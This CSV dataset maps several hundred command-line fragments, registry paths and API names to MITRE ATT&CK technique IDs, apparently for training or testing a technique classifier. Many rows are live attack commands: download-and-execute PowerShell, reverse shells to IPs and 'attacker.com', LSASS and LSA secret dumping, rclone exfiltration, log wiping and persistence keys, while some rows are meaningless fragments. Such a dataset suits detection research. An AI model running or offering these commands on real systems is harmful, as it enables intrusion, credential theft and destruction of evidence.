command,mitre_id
"Add-Type -MemberDefinition '[DllImport(""user32.dll"")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;",T1113
HKCU\Software\Classes\mscfile\shell\open\command,T1574
C:/Program Files(x86)/AnyDesk/AnyDesk.exe,T1219
HKCU\Software\Microsoft,T1027
msacm32.dll,T1036
nmap -oG=/path/to/output-file DATA,T1222
cat $output_file 2>/dev/null,T1082
Test-NetConnection -ComputerName $target,T1016
egui.exe,T1480
PotPlayerDB.dat,T1036
"cd ""$rsp_file_path""",T1218
"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",T1127
cp $root_input_file_path $cped_file_path;,T1486
/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert,T1553
"msedgewebview2.exe --no-sandbox --browser-subprocess-path=""{PATH_ABSOLUTE:.exe}""",T1218
echo 'load_rc_config ${name}' >> $rc_service_path/$rc_service_file,T1543
"node -e 'require(""fs"").writeFileSync(""/path/to/output-file"", ""DATA"")'",T1222
SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.,T1053
DYLD_INSERT_LIBRARIES,T1574
WMIC.exe WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List,T1518
echo '# REQUIRE: LOGIN' >> $rc_service_path/$rc_service_file,T1543
/etc/ystem/system,T1543
rundll.exe,T1569
</target>,T1222
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareWks /t REG_DWORD /d 0 /f",T1070
libc,T1574
"reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art2 /d ""cmd.exe""",T1112
Invoke-Expression $streamcommand,T1059
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt,T1033
"} elseif ($ipAddr -notlike ""*,*"") {",T1046
genisoimage -sort /path/to/input-file,T1005
"echo ""Atomic Red Team TEST"" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM",T1137
} while (-not $result.EndOfMessage),T1539
Start-ATHProcessUnderSpecificParent -FilePath $file_path -CommandLine '$command_line' -ParentId $parent_pid,T1134
"Write-Host ""Error: AzureAD could not connect""",T1484
/var/spool/cron/crontabs/root,T1053
system.bat,T1070
echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh,T1059
Microsoft Windows DeviceSync Service,T1543
ver >> %temp%\download,T1082
"Stop-Process -Name ""WinWord""",T1137
"cmd /c '$netscan_path' /hide /auto:""$env:temp\T1018NetscanOutput.txt"" /range:'$range_to_scan'",T1018
sensitivefiles -noninteractive -consoleoutput,T1552
HTTP GET,T1071
"&$rclone_bin config create ftpserver ""ftp"" ""host"" $ftp_server ""port"" $ftp_port ""user"" $ftp_user ""pass"" $ftp_pass",T1048
WmdmPmSp,T1543
"""$psexec_exe"" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y",T1003
ClearEventLogW,T1070
duo-sid,T1550
C:\example path,T1574
VSLaunchBrowser.exe .exe {REMOTEURL:.exe},T1105
LoadAppInit_DLLs,T1546
touch -a -m -t <timestamp> <filename>,T1070
HKCU\Software\Microsoft\CurrentVersion\Run\,T1547
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1'),T1106
$DomainUsers | Foreach-Object {,T1110
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH},T1105
"sudo sed -i """" ""$indexs,^,$pam_rule\n,g"" $path_to_pam_conf",T1556
HKCU\Software\Microsoft\[dllname],T1112
adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet,T1003
Get-NetTCPConnection | ForEach-Object {,T1049
7z a -p $file_password -mhe=on $encrypted_file_name $input_file_path,T1486
SELECT volumeserialnumber FROM win32_logicaldisk where Name =’C:,T1680
"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}""",T1218
driverquery.exe,T1652
NtSetInformationSymbolicLink,T1611
try{,T1070
if (Test-Path $credFile) {,T1098
"Update.exe --processStart {PATH:.exe} --process-start-args ""{CMD:args}""",T1218
[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale,T1614
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose,T1482
test.au3,T1059
"Write-Host ""End of Hijacking""",T1098
DescribeInstances,T1580
shell.txt,T1140
cat >/path/to/temp-dir/jail.local <<EOF,T1059
echo $ENCODED > $encoded_file && cat < $encoded_file | base64 -d,T1140
sed -i '$ a #art_test_1562_006_1' /etc/$libaudit_config_file_name,T1562
ls.py,T1083
"copy ""$Path_inf"" %TEMP%\ieuinit.inf",T1218
"rundll32.exe $input_file, StartW",T1218
"logger.exe RUNW ""{CMD}""",T1202
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\$clsid' -Value '$clsid_description',T1546
find / -perm +2000 2>/dev/null,T1548
mshta.exe javascript:a=(GetObject('script:$file_url')).Exec();close();,T1218
ImpersonateLoggedOnUser/SetThreadToken,T1134
net user username \password \domain,T1136
"wmic.exe process get brief /format:""{REMOTEURL:.xsl}""",T1218
cdb.exe,T1546
UseLogonCredential,T1112
"Write-Output ""Function code download failed.""",T1528
pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java,T1202
"Write-Host ""Failed to enable SeDebugPrivilege."" -ForegroundColor Red",T1562
exiftool -filename=/path/to/output-file /path/to/input-file,T1005
"""$psexec_exe"" $remote_host -accepteula -c $command_path",T1021
"if($error) {echo ""Virtualization Environment detected""}",T1497
sudo shred -u -z -n 3 $system_log_path,T1070
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices,T1060
at 13:20 /interactive cmd,T1053
restic --password-command='/path/to/command' backup,T1059
"Write-Host ""End of password spraying""",T1110
Get-Process,T1057
C:\,T1059
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
tar -cf {PATH}:ads {PATH_ABSOLUTE:folder},T1564
sleep -s 5,T1036
IPersistFile,T1559
cp /path/to/input-file /path/to/dir/,T1105
rm $history_path,T1070
"New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""",T1546
SecKeychainFindInternetPassword,T1555
"@FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt",T1033
and require utilities such as,T1564
"ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);",T1562
regedit /E $path\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,T1564
Invoke-PSImage,T1027
echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID',T1059
pslist,T1057
EnumWindows,T1055
bee eval '...',T1548
$(pbpaste),T1115
powershell.exe -ep bypass -ec IgBXAGUAIAA8ADMAIABMAE8ATABCAEEAUwAiAA==,T1059
"api_option = ""paste""",T1567
catch { $_; exit $_.Exception.HResult },T1018
-WindowsStyle Hidden,T1564
"echo hello from atomic red team > ""PathToAtomicsFolder\T1140\src\art-expand-source.txt""",T1140
netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10,T1040
echo $ENCODED > $encoded_file && base64 -d $encoded_file,T1140
HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,T1547
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force",T1484
{if (test-connection -Count 1 -computername $machine -quiet),T1105
"restic --password-command='/bin/sh -c ""/bin/sh 0<&2 1<&2""' backup",T1059
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -CommandParamVariation $command_param_variation -Execute -ErrorAction Stop,T1059
bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24',T1202
rpm --eval '%{lua:...}',T1548
/etc/krb5.conf,T1558
net localgroup administrators art-test /add,T1078
win_fw.dll,T1574
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""mount {GUID}"" ""quit"" ""quit""",T1003
~/.zsh_history,T1552
"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt"" -officeProduct ""Word"" -sub ""ClearLogs""",T1070
neofetch --config /path/to/temp-file,T1059
unlink,T1070
"sudo echo osascript -e 'tell app ""Finder"" to display dialog ""Hello World""' >> /etc/rc.common",T1037
config set dir /path/to/output-dir/,T1222
"echo ""ExecStartPre=$execstartpre_action"" >> $systemd_service_path/$systemd_service_file",T1543
Microsoft.CSharp.CSharpCodeProvider,T1027
%COMMONPROGRAMFILES%\Microsoft Shared\wmi\,T1036
"if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq ""6"" ];",T1562
execv,T1574
"Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""shadow""; uValue=[uint32]2} -CimSession $s",T1112
Invoke-CimMethod -ClassName Win32_Product -MethodName $action -Arguments @{ PackageLocation = '$msi_payload' },T1218
netsh interface show,T1016
touch ./etc/pacman.conf,T1059
AmmyyAdmin,T1219
HH.exe {PATH_ABSOLUTE:.exe},T1218
show ssh,T1033
ls -la /tmp/art.txt,T1059
"if ($awsAccessKey -eq """" -or $awsSecretKey -eq """") {",T1567
NtUnmapViewOfSection,T1055
"if (Test-Path -Path ""$env:SystemRoot\System32\rdrleakdiag.exe"") {",T1003
%APPDATA%\..\Local\Temporary Internet Files\Content.Word,T1070
pg /etc/hosts,T1059
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run,T1012
echo /path/to/temp-dir/ >/path/to/temp-file,T1574
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce,T1012
GoogleUpdate.exe,T1574
echo '[Service],T1059
"Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""$executable_binary"" -Force",T1548
"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force",T1562
LoadLibraryExA,T1106
opencode db '...',T1548
PTRACE_DENY_ATTACH,T1622
GetDriveTypeW,T1680
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings,T1012
Dxcap.exe -c {PATH_ABSOLUTE:.exe},T1127
doskey /history > %TEMP%\T1119_2.txt,T1119
dir \\$($domaincontroller)\SYSVOL,T1558
"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi",T1497
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name,T1564
GetProcAddress,T1106
qwinsta.exe,T1033
events {},T1105
MicroNativeCacheSvc,T1547
"if (test-path ""$env:appdata\Opera Software\Opera Stable\Login Data"") {copy-item ""$env:appdata\Opera Software\Opera Stable\Login Data"" -destination ""$exfil_folder\T1555.003Opera_Login Data""} else {}",T1555
msguniq -P /path/to/input-file,T1005
"cmd.exe /c %APPDATA%\svchost.exe ""PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs""",T1036
"Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues",T1556
"bpftrace --unsafe -e 'BEGIN {system(""/bin/sh 1<&0"");exit()}'",T1059
"netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=$NEW_Remote_Port",T1021
netstat -oan,T1049
C:\windows\temp\tmp0207,T1070
"stop-process -name ""cmd"" | out-null",T1036
scp,T1105
Write-Host -ForegroundColor Green $result,T1016
Team Viewer,T1219
ZwRaiseHardError,T1529
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f,T1564
at.deny,T1053
"cmstp.exe /s ""$inf_file_path""",T1218
cmd.exe /c,T1059
sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place,T1070
"enable=* log_password"" >> /etc/pam.d/password-auth sudo echo ""session required pam_tty_audit.so",T1056
PubkeyAuthentication,T1098
readlink,T1562
public class K {,T1566
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f,T1112
{random value name} = “rundll32 shell32 ShellExec_RunDLLA REGSVR /u /s “{dropped copy path and file name}””,T1547
if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi,T1048
cmd.exe /C whoami,T1033
"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full",T1003
strings temp-file.dvi,T1005
az login # Log in to Azure CLI,T1528
add-type $updateWallpapercode,T1491
"Pester.bat [/help|?|-?|/?] ""$null; {CMD}""",T1216
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""$redirection_program"" /f",T1112
echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt,T1202
"lua -e 'local f=io.open(""/path/to/output-file"", ""wb""); f:write(""DATA""); io.close(f);'",T1222
CreateProcessA,T1106
nltest /domain_trusts /all_trusts,T1482
Invoke-MalDoc -macroCode $macrocode -officeProduct $ms_product,T1204
avp.exe,T1057
/.mozilla/firefox/,T1555
$position += 1} catch{}},T1012
"Write-Host "" [!] ${user}:${password} are valid credentials!""",T1110
mofcomp.exe,T1546
Invoke-Kerberoast,T1558
sudo,T1548
strace -s 999 -o /path/to/output-file strace - DATA,T1222
kubectl get cronjobs -n $namespace,T1053
OpenThread,T1055
"dir /s /a c:\ >> ""C:\windows\TEMP\[RANDOM].tmp""",T1083
"cmd.exe /c ""<file_path> > %temp%\PM* .tmp 2>&1""",T1059
cmdkey,T1555
characters with,T1132
"New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32' -Value ""$dll_path""",T1546
espeak -qXf /path/to/input-file,T1005
PTRACE_POKETEXT,T1055
HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run vpdn “%ALLUSERPROFILE%\%APPDATA%\vpdn\VPDN_LU.exe”,T1547
GetlogicalDrives,T1680
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1'),T1003
Temp\SymbolSourceSymbols\icons,T1113
"bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""",T1202
.\kerbrute.exe bruteuser --dc $domaincontroller -d $domain $env:temp\bruteuser.txt TestUser1,T1110
dotnet.exe fsi,T1059
Win32_DiskDrive,T1082
net group domain admins /domain,T1069
[kworker\/0:1],T1036
chmod 6777 /path/to/input-file,T1548
chmod g+s,T1548
"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember ""Domain Admins""",T1069
"Write-Host ""Registry value created: $registryValueName""",T1562
nasm -@ /path/to/input-file,T1005
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""",T1547
wevtutil,T1070
net use * /DELETE /Y,T1070
"echo 'set_var X ""$(/bin/sh 1>&0)""' >/path/to/temp-file",T1059
echo Password1> passwords.txt,T1110
echo ' ${command} /tmp/art-test.marker' >> $rc_service_path/$rc_service_file,T1543
NtCreateThreadEx,T1106
Update.exe --updateRollback={REMOTEURL},T1218
pcalua.exe,T1202
vi -c ':shell',T1059
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f",T1021
restic backup -r rest:http://attacker.com:12345/x /path/to/input-file,T1105
julia -e 'run(`/bin/sh`)',T1059
"$which_python -c ""import bz2;input_file=open('$path_to_input_file','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('$path_to_output_file','w+');output_file.write(str(bz2content));output_file.close();""",T1560
Get-AdComputer -Filter *,T1018
"if [ -x ""$(command -v dscl)"" ]; then dscl . -list /Groups; else echo ""dscl is missing from the machine. skipping...""; fi;",T1069
com.apple.softwareupdate.plist,T1543
Start-Process,T1059
C:\Users\<username>\AppData\Local\Microsoft\Outlook,T1114
C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe,T1036
echo Requesting SYSVOL:,T1558
"grep ""# THIS IS A COMMENT"" /etc/ufw/sysctl.conf",T1562
"mavinject $pid /INJECTRUNNING ""$file_name""",T1056
echo DATA | xxd | xxd -r - /path/to/output-file,T1222
"System.Process.callCommand ""/bin/sh""",T1059
fw.write('DATA');,T1222
"find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""SQLite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;",T1005
setcap cap_setuid+ep /path/to/command,T1548
systeminfo >> %temp%\download,T1082
Get-NetIPAddress,T1016
$error.clear(),T1497
"net.exe group ""domain admins"" /domain",T1069
mawk '//' /path/to/input-file,T1005
audioddg.pdb,T1036
te.exe {PATH:.dll},T1127
RmShutDown,T1489
"Start-Process ""$NetSupport_Path"" -ArgumentList ""/S /v/qn""",T1219
ProcessStartInfo,T1564
fw.close();,T1222
(New-Object Net.WebClient).DownloadString('$target_remote_file') | Out-File $output_file; Invoke-Item $output_file,T1105
/lib/systemd/system/,T1543
tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user,T1222
mmc gpedit.msc,T1218
/sbin/auditd,T1562
pcalua.exe -a $payload_path,T1202
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion,T1082
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices,T1012
"Get-AWSDiscoveryData -Regions $regions -OutputDirectory ""$output_directory""",T1526
"cscript ""$vbscript"" > $env:TEMP\T1059.005.out.txt",T1059
"get-process | ?{$_.Description -like ""*mc*""}",T1518
"Start-Process ""C:\Windows\System32\eventvwr.msc""",T1548
if (Test-Path $fname) {,T1204
AzureADConnectAuthenticationAgentService,T1556
HKLM\SECURITY\Policy\Secrets\*\CurrVal,T1003
latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}',T1222
"$ShortCut.WorkingDirectory = ""C:\Windows\System32"";",T1547
"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f",T1546
%HOMEPATH%\Start Menu\Programs\Startup\Realtek {Unique Identifier}.lnk,T1547
user.,T1564
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f",T1112
ExampleFunctionA,T1218
"echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null",T1558
GetLocalTime(),T1106
WINVNC.exe,T1036
Excel.exe {REMOTEURL},T1105
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot,T1012
LR02DPt22R,T1027
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""esxcli system account list""",T1087
sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD),T1490
WinExec(),T1106
jshell> /open /path/to/input-file,T1005
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""$new_startup_folder""",T1547
key4.db,T1552
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\\[a-f0-9A-F]{8},T1547
cmd /c start /b tasklist,T1057
rar.exe,T1560
Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory,T1574
if (Test-Path $extractFolder) {,T1562
"InstallUtilPath = ""$Env:windir\System32\Tasks\notepad.exe""",T1218
$HOME/Library/LaunchAgents/com.apple.updates.plist,T1543
"start ""$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx""",T1559
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""DllName"" ""$binary_to_execute"" -Type ExpandString -Force",T1547
ps >> $output_file,T1057
"Send-MailMessage -From $sender -To $receiver -Subject 'T1027_Atomic_Test' -Attachments ""$input_file"" -SmtpServer $smtp_server",T1027
uploaddd,T1005
connect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name,T1114
nc attacker.com 12345 >/path/to/output-file,T1105
openssl enc -in /path/to/input-file,T1005
reg save,T1003
"{try{write-output ""$($Position)-$($CLSID)""",T1012
teams.exe,T1218
pr_set_name,T1036
PerfLogs,T1485
"if [ -x ""$(command -v dmidecode)"" ]; then sudo dmidecode | grep -i ""microsoft\|vmware\|virtualbox\|quemu\|domu""; fi",T1082
\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt,T1218
Start-Dnscat2 -Domain $domain -DNSServer $server_ip,T1071
C:\Users\Public\Documentsfiles,T1070
/Library/LaunchDaemons,T1053
reset; sh 1>&0 2>&0,T1059
"for i in $(seq 1 5); do echo ""$i, Atomic Red Team was here!""; sleep 1; done",T1059
